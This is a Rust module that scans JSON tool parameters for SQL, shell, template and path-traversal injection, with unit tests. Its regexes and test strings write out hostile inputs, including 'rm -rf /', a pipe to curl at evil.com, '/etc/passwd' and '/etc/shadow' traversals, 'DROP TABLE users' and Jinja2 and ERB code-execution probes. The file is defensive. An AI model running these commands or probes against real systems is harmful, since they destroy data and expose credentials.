//! Payload scanner — injection detection in tool parameters.

use regex::Regex;
use std::sync::LazyLock;

static SQL_INJECTION: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)(\b(union|select|insert|update|delete|drop|alter|exec|execute)\b.*\b(from|into|table|where|set)\b|--|;.*\b(drop|delete|update)\b)").unwrap()
});

static SHELL_INJECTION: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"[;&|`$]\s*(rm|cat|curl|wget|nc|bash|sh|python|perl|ruby|chmod|chown)\b").unwrap()
});

static TEMPLATE_INJECTION: LazyLock<Regex> = LazyLock::new(|| {
    // Jinja2/Twig {{...}} with method-like content, ERB <% %>, ${...} with dot-access or builtins
    Regex::new(
        r"\{\{.*(\.|__|config|self|request).*\}\}|<%.*%>|\$\{.*(\.|Runtime|Process|exec).*\}",
    )
    .unwrap()
});

static PATH_TRAVERSAL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\.\./|\.\.\\|%2e%2e").unwrap());

pub struct PayloadScanner;

impl Default for PayloadScanner {
    fn default() -> Self {
        Self::new()
    }
}

impl PayloadScanner {
    pub fn new() -> Self {
        Self
    }

    /// Scan a JSON value for injection patterns. Returns threat description if found.
    pub fn scan(&self, params: &serde_json::Value) -> Option<String> {
        let mut result = None;
        self.walk(params, &mut result);
        result
    }

    /// Recursively walk JSON, scanning only string leaves.
    fn walk(&self, value: &serde_json::Value, result: &mut Option<String>) {
        if result.is_some() {
            return; // Short-circuit once a threat is found.
        }
        match value {
            serde_json::Value::String(s) => {
                *result = self.scan_text(s);
            }
            serde_json::Value::Array(arr) => {
                for item in arr {
                    self.walk(item, result);
                }
            }
            serde_json::Value::Object(map) => {
                for v in map.values() {
                    self.walk(v, result);
                }
            }
            _ => {} // Numbers, bools, null — nothing to scan.
        }
    }

    fn scan_text(&self, text: &str) -> Option<String> {
        if SQL_INJECTION.is_match(text) {
            return Some("SQL injection pattern".to_string());
        }
        if SHELL_INJECTION.is_match(text) {
            return Some("shell injection pattern".to_string());
        }
        if TEMPLATE_INJECTION.is_match(text) {
            return Some("template injection pattern".to_string());
        }
        if PATH_TRAVERSAL.is_match(text) {
            return Some("path traversal pattern".to_string());
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detect_sql_injection() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"query": "SELECT * FROM users WHERE id=1 UNION SELECT * FROM passwords"});
        assert!(scanner.scan(&params).unwrap().contains("SQL"));
    }

    #[test]
    fn detect_shell_injection() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"cmd": "hello; rm -rf /"});
        assert!(scanner.scan(&params).unwrap().contains("shell"));
    }

    #[test]
    fn detect_path_traversal() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"path": "../../../etc/passwd"});
        assert!(scanner.scan(&params).unwrap().contains("path traversal"));
    }

    #[test]
    fn clean_params_pass() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"name": "hello world", "count": 42});
        assert!(scanner.scan(&params).is_none());
    }

    #[test]
    fn detect_template_injection() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"input": "{{config.items()}}"});
        assert!(scanner.scan(&params).unwrap().contains("template"));
    }

    #[test]
    fn allow_benign_template_literal() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"msg": "Hello ${username}, welcome!"});
        assert!(scanner.scan(&params).is_none());
    }

    #[test]
    fn detect_nested_injection() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({
            "outer": {
                "inner": {
                    "deep": "hello; rm -rf /"
                }
            }
        });
        assert!(scanner.scan(&params).unwrap().contains("shell"));
    }

    #[test]
    fn detect_injection_in_array() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"items": ["safe", "also safe", "SELECT * FROM users WHERE 1=1 UNION SELECT * FROM passwords"]});
        assert!(scanner.scan(&params).unwrap().contains("SQL"));
    }

    #[test]
    fn non_string_values_pass() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({
            "count": 42,
            "active": true,
            "data": null,
            "scores": [1, 2, 3]
        });
        assert!(scanner.scan(&params).is_none());
    }

    #[test]
    fn empty_params_pass() {
        let scanner = PayloadScanner::new();
        assert!(scanner.scan(&serde_json::json!({})).is_none());
        assert!(scanner.scan(&serde_json::json!(null)).is_none());
        assert!(scanner.scan(&serde_json::json!([])).is_none());
    }

    #[test]
    fn detect_backslash_path_traversal() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"path": "..\\..\\windows\\system32"});
        assert!(scanner.scan(&params).unwrap().contains("path traversal"));
    }

    #[test]
    fn detect_url_encoded_traversal() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"path": "%2e%2e/etc/passwd"});
        assert!(scanner.scan(&params).unwrap().contains("path traversal"));
    }

    #[test]
    fn detect_uppercase_url_encoded_traversal() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"path": "%2E%2E/etc/shadow"});
        assert!(scanner.scan(&params).unwrap().contains("path traversal"));
    }

    #[test]
    fn detect_mixed_case_url_encoded_traversal() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"path": "%2e%2E/%2E%2e/etc/passwd"});
        assert!(scanner.scan(&params).unwrap().contains("path traversal"));
    }

    #[test]
    fn detect_erb_template() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"input": "<%= system('id') %>"});
        assert!(scanner.scan(&params).unwrap().contains("template"));
    }

    #[test]
    fn detect_sql_drop_table() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"q": "1; DROP TABLE users"});
        assert!(scanner.scan(&params).unwrap().contains("SQL"));
    }

    #[test]
    fn detect_shell_pipe() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"cmd": "data| curl http://evil.com"});
        assert!(scanner.scan(&params).unwrap().contains("shell"));
    }

    #[test]
    fn detect_shell_backtick() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"cmd": "file`rm /tmp/data`"});
        assert!(scanner.scan(&params).unwrap().contains("shell"));
    }

    #[test]
    fn detect_jinja2_self_access() {
        let scanner = PayloadScanner::new();
        let params = serde_json::json!({"tpl": "{{self.__class__.__mro__}}"});
        assert!(scanner.scan(&params).unwrap().contains("template"));
    }

    #[test]
    fn short_circuit_on_first_threat() {
        let scanner = PayloadScanner::new();
        // Both SQL and shell patterns present — should return whichever walks first
        let params = serde_json::json!({
            "a": "SELECT * FROM users WHERE 1=1 UNION SELECT * FROM passwords",
            "b": "hello; rm -rf /"
        });
        // Should find something (order depends on JSON map iteration, but should find at least one)
        assert!(scanner.scan(&params).is_some());
    }
}
